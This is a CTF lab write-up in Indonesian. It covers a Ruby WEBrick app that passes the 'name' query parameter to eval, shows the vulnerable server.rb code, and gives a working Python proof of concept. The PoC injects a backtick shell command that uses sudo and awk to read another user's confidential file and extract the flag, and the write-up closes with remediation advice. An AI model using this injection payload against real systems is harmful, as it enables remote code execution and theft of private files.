---
title: Rahasia Anis
description: Writeup lab Rahasia Anis
tags:
  - input injection
  - code injection
  - ruby
  - CTF
draft: false
---

## Summary
* Vuln Name: `eval()` Injection via String Interpolation (Code Injection)
* Type: Input Injection
* Impact: Remote Code Execution (RCE)
* Severity: Critical
* functionality: [[input-validation]]

## Metodologi dan Observasi
1. Pada aplikasi web mini berbasis Ruby (WEBrick) ini, pengguna dapat mengirimkan nama spesifik untuk diberikan salam (*greeting*) melalui parameter GET `name`.
2. Jika kita melihat pada skrip `server.rb`, alur penerimaan input dan _output_-nya berjalan seperti berikut:
   ```ruby
   if req.query["name"]
     name = req.query["name"]
   end

   begin
     result = eval("'Hello ' + \"#{name}\"")
     res.body = result.to_s
   ```
3. Modul ini rentan karena parameter *query* `name` tidak dibersihkan dengan memadai ([[input-validation]]) sebelum dimasukkan ke dalam blok string yang dievaluasi dengan fungsi internal `eval` khas Ruby.
4. *String Interpolation* (`#{}`) pada bahasa Ruby mengeksekusi apa pun ekspresi yang ada di dalam tanda kurungnya untuk kemudian digabungkan (*concatenate*) ke badan _string_ luarnya. Dalam konteks spesifik skrip ini, di dalam _eval string_, terdapat kalimat utuh: `'Hello ' + "#{name}"`.
5. Oleh karena input diinjeksikan secara kasar ke dalam _eval string_ tersebut, kita bisa mencurangi *evaluator* dengan memasukkan nilai seperti `" + \`command\` + "`. Karakter *backtick* (``` ` ```)` di dalam _Ruby_ adalah sinonim dari sistem panggilan OS komanda (*shell exec*).
6. Hal ini membentuk sintaks *eval string* layaknya: `'Hello ' + "" + `command` + ""`. Celah ini tak ubahnya wujud klasik dari cacat arsitektur [[code-injection]].

## PoC
Skrip eksploit ini mendemonstrasikan bagaimana parameter `name` dibubuhi oleh sisipan modifikasi (tanda kutip dan interpolasi *backticks*) untuk merengkuh eskalasi `sudo` ke _user_ `anis`.

```python
import requests
import urllib.parse
import re

url = "http://localhost:1337/"

# Kita memanfaatkan perintah `awk` agar pembacaan fail teks bisa dieksekusi sebaris  
cmd = "sudo -u anis /usr/bin/awk '{print}' /home/anis/confidential.txt"

# Membangun eval payload untuk lolos di skrip Ruby: " + `cmd` + "
payload = f"\" + `{cmd}` + \""
exploit_url = f"{url}?name={urllib.parse.quote(payload)}"

# Eksekusi RCE
res = requests.get(exploit_url)

if "pwn{" in res.text:
    flags = re.findall(r'pwn\{[a-f0-9]+\}', res.text)
    for flag in flags:
        print(f"[+] Flag found: {flag}")
```

## Impact
Eksekusi string dinamis pada lingkungan yang memiliki sintaks kuat layaknya Ruby membuka ancaman [[remote-code-execution]]. Pelaku bisa mengirim peranti selongsong komando lintas peladen di atas server rentan tersebut. Hindari pemakaian *eval()* sebisa mungkin, atau jika harus merakit salam kustom, pemosisian variabel tak perlu dibalik formatnya ke *eval*, melainkan cukup _echo_ string dinamis (*string concatenation* standar).
